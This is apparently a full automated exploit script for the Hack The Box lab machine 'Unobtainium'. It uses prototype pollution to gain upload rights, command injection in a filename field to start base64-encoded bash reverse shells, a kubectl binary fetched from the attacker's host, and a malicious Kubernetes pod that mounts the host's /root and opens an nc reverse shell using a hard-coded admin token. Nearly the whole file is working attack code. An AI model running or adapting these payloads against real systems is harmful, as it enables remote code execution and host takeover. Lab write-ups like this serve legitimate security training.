#!/usr/bin/python3
# author : Raj Chowdhury [RootRaj]

import random
import base64
import argparse
from pwn import *
import socket
import time
import readline
import os
import requests
import json
import warnings

from requests.api import head

warnings.filterwarnings('ignore')

context.log_level = 'error'
# host a python3 web server with this file inside on port 80
# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

parser = argparse.ArgumentParser()
parser.add_argument('ip', type=str)
# parser.add_argument('port', type=int)
parser.parse_args()
args = parser.parse_args()


port = 31337
url = f'http://unobtainium.htb:{str(port)}'

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
    'Content-Type': 'application/json'
}


auth = {
    "name": "felamos",
    "password": "Winter2021"
}

text = {
    "constructor": {
        "prototype": {
            "canDelete": True,
            "canUpload": True
        }
    }
}

put_msg = {
    "auth": auth,
    "message":
    {
        "text": text
    }
}


data = {
    'auth': auth,
    "filename": "package.json"
}

put_data = {'auth': auth,
            "message": put_msg
            }

# print('stage 1, change privilege')
r = requests.put(url,
                 json=put_data,
                 headers=headers,
                 #  proxies=proxies
                 )
# print(r.text)

# exit()
upload = f'{url}/upload'
execute = f'{url}/todo'
# time.sleep(2)
# print('stage 2, rev_shell')

upl = {'auth': auth,
       }


rev = {'auth': auth,
       "filename": f"& echo $(echo 'bash -i >& /dev/tcp/{args.ip}/9001 0>&1' | base64) | base64 -d | bash"
       }


# w/r perms
second_rev_shell = """
# w/r perms
curl -s \
     -X PUT \
     -A "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" \
     -H "Content-Type: application/json" \
     -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"text":{"constructor":{"prototype":{"canDelete":true,"canUpload":true}}}}}' \
     "http://127.0.0.1:3000/"

# rev shell
curl -s \
     -A "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" \
     -H "Content-Type: application/json" \
     -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNi85MDAyIDA+JjEK | base64 -d | bash"}' \
     -o /dev/null \
     "http://127.0.0.1:3000/upload"
"""

second_rev_shell = """
# w/r perms
curl -s \
     -X PUT \
     -A "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" \
     -H "Content-Type: application/json" \
     -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"text":{"constructor":{"prototype":{"canDelete":true,"canUpload":true}}}}}' \
     "http://127.0.0.1:3000/"

# rev shell
curl -s \
     -A "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" \
     -H "Content-Type: application/json" \
     -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& echo """ + base64.b64encode(f'bash -i >& /dev/tcp/{args.ip}/9002 0>&1'.encode('latin-1')).decode('latin-1') + """ | base64 -d | bash"}' \
     -o /dev/null \
     "http://127.0.0.1:3000/upload"
"""

# rev shell mounted /root
root_esc = f"""

rm xkubectl
wget {args.ip}:8080/xkubectl
chmod +x xkubectl
echo 'apiVersion: v1
kind: Pod
metadata:
  name: some-random-pod-{str(random.randint(10**5, 10**6))}
  namespace: default
spec:
  containers:
    - name: web
      image: localhost:5000/dev-alpine
      command: ["/bin/sh"]
      args: ["-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.ip} 9005 >/tmp/f"]
      volumeMounts:
      - mountPath: /root/
        name: root-flag
  volumes:
  - hostPath:
      path: /root/
      type: ""
    name: root-flag' > rootraj.yaml

./xkubectl create -f rootraj.yaml --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
"""

# print(r.text)
context.log_level = 'error'
with process(["nc", "-lvnp", '9001']) as listener1:
    # print(listener1.recv())
    r = requests.post(upload,
                      json=rev,
                      #   proxies=proxies
                      )
    data_ = json.dumps(data)
    # print(data_)
    # print(r.text)
    while not(listener1.can_recv()):
        pass
    # listener.recvall(226)

    listener1.send('cat /root/user.txt\n')
    listener1.recvuntil('.txt')
    user_flag = listener1.recvuntil('root').decode('latin-1').split('\n')[1]
    # print('User flag = ' + user_flag)

    pty = process.PTY
    # flag = listener.recv()
    with process(["nc", "-lvnp", '9002']) as listener2:
        listener1.send(second_rev_shell)
        # listener1.interactive()
        # listener2.interactive()
        with process(["nc", "-lvnp", '9005']) as listener3:
            listener2.send(root_esc)
            # listener3.interactive()
            listener3.recvuntil('\n')
            listener3.recvuntil('\n')
            listener3.send('cat /root/root.txt\n')
            listener3.recvuntil('\n')
            # print(listener3.recvuntil('\n'))
            root_flag = listener3.recvuntil(
                '\n').decode('latin-1').split(' ')[-1]
            # listener3.interactive()

        # listener2.interactive()

print(f"user flag: {user_flag}")
print(f"root flag: {root_flag.strip()}")
